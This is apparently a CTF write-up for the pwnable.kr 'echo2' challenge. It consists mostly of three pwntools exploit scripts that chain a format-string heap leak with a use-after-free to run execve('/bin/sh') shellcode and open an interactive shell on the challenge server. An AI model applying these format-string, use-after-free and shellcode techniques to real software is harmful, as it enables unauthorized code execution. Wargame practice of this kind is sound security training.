### Crash sequence
```txt
hey, what's your name? : AAAAAAAAAAAAAAAAAAAAAAAA
> 3
BBBBBBBBBBBBBBBBBBBBBBBB
> 4
Are you sure you want to exit? (y/n)n
> 3
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
[*] Exact match at offset 24
```

### Final Exploit
```py
#!/usr/bin/python

from pwn import *
import struct

context.arch = 'amd64'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 64

offset = 0x4d
padding = "\x41"*24
sc = asm(shellcraft.sh())
#p = remote("localhost", 9011)
p = remote("pwnable.kr", 9011)

log.success("Sending Name")
p.recvuntil("hey, what's your name? :")
p.sendline(padding)
p.recvuntil(">")		

log.success("Leaking Heap")
p.sendline('2')
p.recvline()
p.sendline("%x."*36)					
leak = p.recvlines(25)[24].split('.')
address = p64(int(leak[len(leak)-2],16)-offset)

log.success("Trying UAF")
p.sendline("4")
p.sendline("n")
p.sendline("3")
p.sendline(padding+address+sc)
p.interactive()
```
### Poc
```py
#!/usr/bin/python

from pwn import *
import struct

context.arch = 'amd64'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 64

### Note: %10$x shows address at position 10. %10$s shows value at 10. use %n$x to find corresponding positions.
class Solution(object):
	def __init__(self, debug = False):		
		if(debug):
			self.proc = process(["/usr/bin/gdb", "-q", "/root/CTF/echo2-ctf/echo2"])
			self.proc.sendline("run")			
		else:						
			self.proc = remote("pwnable.kr", 9011)
	
	def run(self):
		p = self.proc			
		padding = "\x90"*24				
		stackOffset = 0x7ffeffffffe0		
		heapOffset = 0x4d

		# small shellcode 24 bytes
		sc = asm("mul esi")
		sc += asm("push rax")
		sc += asm("movabs rdi,0x68732f2f6e69622f")
		sc += asm("push rdi")
		sc += asm("mov rdi, rsp")
		sc += asm("mov al, 0x3b")
		sc += asm("syscall")		

		p.recvuntil("hey, what's your name? :")
		p.sendline(sc)
		p.recvuntil(">")		
		p.sendline("2")		
		p.recvline()

		# stack leak
		# small shellcode...
		#p.sendline("%x."*10)			
		#leak = p.recvline().split('.')		
		#address = p64(int(leak[len(leak)-2],16)+stackOffset)	
		#log.success("Stack Leak Address: {0}".format(address.encode('hex')))

		# heap leak
		# large shellcode...
		p.sendline("%x."*36)					
		leak = p.recvlines(25)[24].split('.')
		address = p64(int(leak[len(leak)-2],16)-heapOffset)			
		log.success("Heap Leak Address: {0}".format(address.encode('hex')))
		
		p.sendline("4")
		p.sendline("n")
		p.sendline("3")			
		p.sendline(padding+address+sc)
		p.interactive()

Solution(True).run()
```

### PoC Works (draft)
```py
#!/usr/bin/python

from pwn import *
import struct

context.arch = 'amd64'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 64

o = 0x602098	
soffset = 0x7ffeffffffe0
hoffset = 0x4d

padding = "\x41"*24
#p = process(["/usr/bin/gdb", "-q", "/root/CTF/echo2-ctf/echo2"])
#p.sendline("run")			
#p = remote("localhost", 9011)
p = remote("pwnable.kr", 9011)

# Shellcode Task			
sc = '6a6848b82f62696e2f2f2f73504889e731f66a3b58990f05'.decode('hex')			
finder = '48894054'.decode('hex')			
finder += ('\x90' * (4 - (len(finder) % 4)))
sc += ('\x90' * (4 - (len(sc) % 4)))

p.recvuntil("hey, what's your name? :")
p.sendline(padding)
p.recvuntil(">")		

# Leak Task
# heap leak
# large shellcode...
p.sendline('2')
p.recvline()
p.sendline("%x."*36)					
leak = p.recvlines(25)[24].split('.')
address = p64(int(leak[len(leak)-2],16)-hoffset)			
log.success("Heap Leak Address: {0}".format(address.encode('hex')))

# Leak Task
# p.sendline('2')
# p.sendline('%%%dc%%10$n' % o)
# p.recvline()
 
# p.recvuntil('>')
# p.sendline('2')
# p.sendline('%18$s')
# p.recvline()
 
# ptr = u64(p.recvline()[:-1].ljust(8, '\x00'))
# byebye = ptr + 0x20

# print hex(ptr)
# print hex(byebye)

# UAF Task
p.sendline("4")
p.sendline("n")
p.sendline("3")			
p.sendline(padding+address+sc+finder)
p.interactive()
```